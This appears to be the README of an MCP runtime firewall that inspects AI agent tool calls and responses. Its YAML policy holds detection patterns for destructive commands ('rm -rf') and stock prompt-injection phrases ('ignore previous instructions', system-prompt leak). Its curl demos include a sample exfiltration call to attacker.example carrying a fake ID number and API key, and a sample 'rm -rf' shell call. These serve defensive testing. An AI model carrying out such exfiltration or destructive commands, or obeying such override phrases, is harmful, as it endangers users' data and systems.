# MCP Kcops

Spring Boot WebFlux based MCP Runtime Firewall walking skeleton. It does not call any external guardrail API; request and response inspection is driven by local detectors and YAML policy.

감사·지문·앵커의 블로킹 파일 IO는 `boundedElastic`로 오프로드되어 Netty 이벤트 루프를 막지 않는다.

## 탐지 건전성과 자원 상한

- 탐지는 원시 JSON과 Jackson이 디코딩한 문자열 값을 함께 검사해 `\uXXXX` 같은 JSON 인코딩 우회를 완화한다. 평문 PII/secret은 원시 본문의 절대 오프셋으로 기존과 동일하게 마스킹하며, 디코딩 값에서만 발견되어 안전한 마스킹 스팬이 없는 응답은 원문을 전달하지 않고 차단한다.
- 요청·응답 detector가 예외를 던지면 해당 방향을 `BLOCK`/`DETECTOR_ERROR`로 강제하고 감사 로그를 남기는 fail-closed 방식으로 처리한다.
- 승인 저장소는 `kcops.approval.maxPending`(기본값 `1000`)으로 크기를 제한한다. 초과 시 오래된 승인·거절 항목을 먼저 제거하고, 부족하면 오래된 대기 항목을 제거한다.

## 승인 후 실제 실행 (재제출 토큰)

요청 방향에서 `REQUIRE_APPROVAL`이 나오면 응답 본문 최상위에 `approvalId`가 함께 전달되고, 원본 요청 본문은 승인 저장소에 보관된다(관리자 API 응답으로는 노출되지 않음). 흐름은 다음과 같다.

1. 에이전트 요청 → `{"decision":"REQUIRE_APPROVAL", "approvalId":"<id>", ...}`.
2. 관리자가 `POST /admin/approvals/<id>/approve`(Bearer 토큰)로 승인.
3. 에이전트가 **동일한 본문**을 헤더 `X-Kcops-Approval-Id: <id>`와 함께 재전송.
4. 본문의 SHA-256 해시가 보관된 해시와 일치하고 상태가 `APPROVED`이면 요청 검사를 건너뛰고 업스트림으로 1회 전달한다(감사 `ALLOW`/`APPROVAL_EXECUTED`). 토큰은 `CONSUMED`로 소비되어 재사용할 수 없다.

미승인·본문 변조(해시 불일치)·토큰 재사용 재제출은 모두 다시 차단된다. 응답 방향 `REQUIRE_APPROVAL`(업스트림이 이미 실행됨)에는 이 재제출 흐름이 적용되지 않는다.

## R1 — 도구 메타데이터 인젝션 검사

`tools/list` 응답의 도구 이름, 설명, 입력 스키마 문자열을 로컬 인젝션 패턴으로 검사한다. 최초 관찰이라 지문 변경이 없는 도구도 악성 메타데이터가 발견되면 `REQUIRE_APPROVAL`/`TOOL_METADATA_INJECTION_SUSPECTED`로 처리한다. 지문 변경과 동시에 탐지되면 기존 `TOOL_DESCRIPTION_FINGERPRINT_CHANGED`가 대표 reason으로 유지된다.

## R2 — 간접 피드백 모드

기본값 `kcops.discloseDetectors: true`에서는 기존처럼 실제 reason과 detector 목록을 반환한다. 운영에서 `false`로 설정하면 외부 응답 reason은 `POLICY_VIOLATION`, detectors는 빈 배열로 일반화하지만 `logs/audit.jsonl`에는 실제 reason과 detector 목록을 그대로 기록한다.

## R4 — JSON 재귀 깊이 상한

JSON 문자열 추출은 최대 깊이 200까지만 순회한다. 이보다 깊은 하위 노드는 조용히 건너뛰어 과도한 중첩 입력에 의한 스택 고갈을 방지하며 일반적인 얕은 페이로드의 추출 동작은 유지한다.

## 감사 무결성

감사 무결성의 보장 범위는 다음과 같다.

1. 해시 체인은 감사 로그의 단순 수정·중간 삭제를 **탐지**하며, 위·변조 자체를 방지하지는 않는다.
2. 로컬 append-only 앵커는 앵커 게시 후 감사 로그 전체를 다시 계산한 공격을 앵커 해시 불일치로 탐지한다. 앵커가 없으면 전체 재계산 공격은 탐지할 수 없다.
3. 감사 로그와 로컬 앵커를 모두 수정할 수 있는 동일 공격자에게는 무력화될 수 있다. 진짜 불변성은 외부 불변 저장소 또는 디지털 서명이 필요하다.

관리자 API:

- `POST /admin/audit/anchor`: 현재 감사 로그의 레코드 수와 최신 해시를 `logs/audit-anchor.jsonl`에 추가한다.
- `GET /admin/audit/verify`: 해시 체인과 게시된 모든 앵커를 검증한다.

## Build

```bash
./gradlew build
```

Windows PowerShell:

```powershell
.\gradlew.bat build
```

## Run

Terminal 1 runs the mock MCP server on port 8090:

```powershell
.\gradlew.bat bootRun --args="--spring.profiles.active=mock"
```

Terminal 2 runs the proxy on port 8080:

```powershell
.\gradlew.bat bootRun
```

Audit logs are written as JSON Lines to `logs/audit.jsonl` by default.

### Docker Compose

Build the shared application image and start the mock MCP server on port 8090 and the proxy firewall on port 8080:

```bash
docker compose up --build
```

To enable the administrator API, inject its token from the host environment:

```bash
KCOPS_ADMIN_TOKEN=secret docker compose up --build
```

Windows PowerShell:

```powershell
$env:KCOPS_ADMIN_TOKEN = "secret"
docker compose up --build
```

Stop and remove the containers:

```bash
docker compose down
```

The image build requires internet access to download the base images and Gradle dependencies. In a closed network, build the image in an approved connected environment and import it through an internal registry before running the containers.

## 관리자 API 인증

`/admin/**` API는 `kcops.admin.token`으로 보호된다. 기본값은 빈 문자열이며, 이 경우 관리자 API는 fail-closed 방식으로 비활성화되어 HTTP 503을 반환한다. 운영 환경에서는 설정 파일에 토큰을 저장하지 말고 환경변수 또는 커맨드라인으로 주입한다.

```powershell
$env:KCOPS_ADMIN_TOKEN = "secret"
.\gradlew.bat bootRun

# 또는 커맨드라인 오버라이드
.\gradlew.bat bootRun --args="--kcops.admin.token=secret"
```

관리자 요청은 Bearer 토큰을 전달해야 한다.

```bash
curl -H "Authorization: Bearer secret" http://localhost:8080/admin/approvals
```

보조 호환 헤더로 `X-Kcops-Admin-Token: secret`도 사용할 수 있다. `/mcp`는 관리자 인증 대상이 아니다.

## 크기 상한과 업스트림 장애 처리

프록시는 기획서 6.7의 일부로 요청·응답 버퍼 크기와 업스트림 응답 시간을 제한한다.

```yaml
kcops:
  upstreamTimeoutMs: 10000
  limits:
    maxRequestBytes: 262144
    maxResponseBytes: 262144
    overLimitAction: require_approval
```

- 요청 본문이 `maxRequestBytes`를 넘으면 업스트림을 호출하지 않고 `REQUEST_TOO_LARGE` 결정을 반환한다. 기본 액션은 `REQUIRE_APPROVAL`이며 승인 기능이 켜져 있으면 관리자 승인 큐에 적재한다.
- 업스트림 응답이 `maxResponseBytes`를 넘으면 응답 본문을 전달하지 않고 `BLOCK`/`RESPONSE_TOO_LARGE`를 반환한다.
- 업스트림 연결 실패, HTTP 오류, 타임아웃은 `BLOCK`/`UPSTREAM_UNAVAILABLE` JSON-RPC 오류로 변환하고 감사 로그에 기록한다.
- 빈 POST 본문은 `BLOCK`/`INVALID_REQUEST`로 처리하며 업스트림을 호출하지 않는다.

현재 구현은 전체 응답 버퍼에 대한 상한을 적용한다. 대용량 응답의 슬라이딩 윈도우 분할 검사는 향후 과제다.

## Policy YAML

Policy is configured under `kcops` in `application.yml`.

```yaml
kcops:
  mode: enforce
  upstreamUrl: http://localhost:8090/mcp
  auditLogPath: logs/audit.jsonl
  auditAnchorPath: logs/audit-anchor.jsonl
  discloseDetectors: true
  approval:
    enabled: true
    maxPending: 1000
  request:
    toolCall:
      action: require_approval
      highRiskTools: [send_email, post_webhook, http_request]
    egress:
      action: block
      allowDomains: [company.internal, api.trusted-service.com]
      riskyKeywords: [send, export, upload, post, 전송, 업로드, 내보내기]
    destructive:
      action: require_approval
      patterns: [delete, "drop table", "rm -rf", truncate, 삭제, 초기화]
    scope:
      action: require_approval
      patterns: ["select *", "select * from", "전체 메일", "모든 파일", "/*"]
    pii:
      action: require_approval
      detectors: [korean_rrn, korean_phone, email, jwt, api_key, ssh_private_key]
  response:
    toolMetadata:
      action: require_approval
    injection:
      action: block
      decodeBase64: true
      patterns: []
      types:
        ignore_previous_instruction: ["이전 지시를 무시", "ignore previous instructions"]
        system_prompt_leak: ["시스템 프롬프트를 출력", "system prompt"]
        external_exfiltration: ["전체 메일을 전송", "send to external"]
    pii:
      action: mask
      detectors: [korean_rrn, korean_phone, email, jwt, api_key, ssh_private_key]
```

Actions are `allow`, `mask`, `block`, `require_approval`, and `log_only`. When multiple findings are present, the strongest action wins: `BLOCK > REQUIRE_APPROVAL > MASK > LOG_ONLY > ALLOW`.

`kcops.mode: log_only` downgrades enforcing actions (`block`, `require_approval`, `mask`) to `LOG_ONLY`, so traffic continues to the upstream server while findings are still written to the audit log.

Current detector mappings:

- Request `TOOL_CALL`, `EGRESS`, `DESTRUCTIVE`, `SCOPE`, and request PII/secret findings use the matching `kcops.request.*.action`.
- Response `INJECTION` findings use `response.injection.action`.
- Response PII/secret findings use concrete mask spans. When `response.pii.action: mask`, the proxy returns the upstream JSON body with those spans masked in place.

Response prompt injection inspection emits one finding per matched subtype. Subtype names such as `ignore_previous_instruction` and `external_exfiltration` are preserved in the audit log `detectors` field.

## Week 4 Request Firewall

The request direction now includes local, closed-network detectors for:

- High-risk tool names from `kcops.request.toolCall.highRiskTools`.
- Destructive command patterns from `kcops.request.destructive.patterns`.
- Excessive scope patterns from `kcops.request.scope.patterns`.
- Request argument DLP baseline: `korean_rrn`, `korean_phone`, `email`, `korean_bank_account`, `korean_address`, `api_key`, `jwt`, and `ssh_private_key`.

No detector calls an external guardrail or network API.

## Week 5 Korean PII and Secret Masking

All DLP checks are local regex, context, and checksum rules. The scanner returns absolute offsets against the raw MCP JSON body so response masking can be applied directly to the upstream payload.

- `korean_rrn`: matches only `######-#######` values that pass the Korean resident registration checksum. `900101-1234568` is accepted; `900101-1234567` is rejected as a checksum false positive. Masking preserves the hyphen: `******-*******`.
- `korean_phone`: masks the middle mobile-number group, for example `010-1234-5678` becomes `010-****-5678`.
- `email`: preserves the first local-part character and the domain, for example `hong@example.com` becomes `h***@example.com`.
- `korean_bank_account`: fires only when account-like numbers appear with context keywords such as `은행`, `계좌`, `입금`, `예금주`, or `송금`.
- `korean_address`: preserves the city/district prefix and replaces the detailed road/address segment with `****`, for example `서울특별시 강남구 테헤란로 123` becomes `서울특별시 강남구 ****`.
- `api_key`, `jwt`, and `ssh_private_key`: treated as `SECRET`; API keys keep the first four characters, JWTs are fully char-masked, and SSH private-key blocks are replaced with `****`.

Korean name candidates are not standalone findings and are never masked by themselves. They are available only as an auxiliary scanner signal, so text like `홍길동입니다` remains unchanged unless another PII/secret rule matches.

## Response Injection Detection Limits

The response injection detector is an explicit keyword/regex baseline. Synonyms, paraphrases, unsupported languages, and payloads split across fields or chunks can bypass it; optional Base64 decoding only closes part of that gap. `ResponseDetector` is the plug-in extension point where a future local LLM or external semantic classifier can replace or supplement this baseline.

## curl Demos

### Malicious Request Block

```bash
curl -s -X POST http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"post_webhook","arguments":{"url":"https://attacker.example/upload","body":"secret 900101-1234567 sk-live-abc"}}}'
```

Expected response includes:

```json
{"decision":"BLOCK","reason":"SENSITIVE_DATA_EGRESS_RISK","detectors":["korean_rrn","api_key","external_egress"]}
```

### Destructive Command Approval

```bash
curl -s -X POST http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"execute_shell","arguments":{"command":"rm -rf /workspace/tmp/*"}}}'
```

Expected response includes `"decision":"REQUIRE_APPROVAL"`.

### Excessive Scope Approval

```bash
curl -s -X POST http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"query_database","arguments":{"query":"SELECT * FROM customers"}}}'
```

Expected response includes `"decision":"REQUIRE_APPROVAL"`.

### Malicious Response Block

```bash
curl -s -X POST http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"calendar_lookup","arguments":{"trigger":"injection"}}}'
```

Expected response includes:

```json
{"decision":"BLOCK","reason":"PROMPT_INJECTION_DETECTED","detectors":["ignore_previous_instruction","external_exfiltration"]}
```

### Normal Allow

```bash
curl -s -X POST http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"calendar_lookup","arguments":{"url":"https://company.internal/calendar","query":"meeting schedule"}}}'
```

The original upstream result is returned.
